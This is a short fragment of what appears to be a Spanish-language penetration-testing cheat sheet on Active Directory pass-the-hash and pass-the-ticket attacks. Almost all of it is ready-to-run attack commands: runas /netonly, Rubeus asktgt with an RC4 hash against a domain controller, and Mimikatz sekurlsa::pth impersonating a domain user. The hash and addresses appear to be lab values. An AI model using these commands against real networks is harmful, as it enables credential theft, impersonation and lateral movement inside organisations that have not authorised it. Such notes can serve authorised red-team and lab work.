...
```c
runas /netonly /user:DOMAIN.local\jackie.may powershell
```
...
```c
rubeus.exe asktgt /user:jackie.may /domain:DOMAIN.local /dc:10.10.110.100 /rc4:ad11e823e1638def97afa7cb08156a94
```

### Pass-the-Hash con Mimikatz

```c
mimikatz.exe sekurlsa::pth /domain:DOMAIN.local /user:jackie.may /rc4:ad11e823e1638def97afa7cb08156a94
```
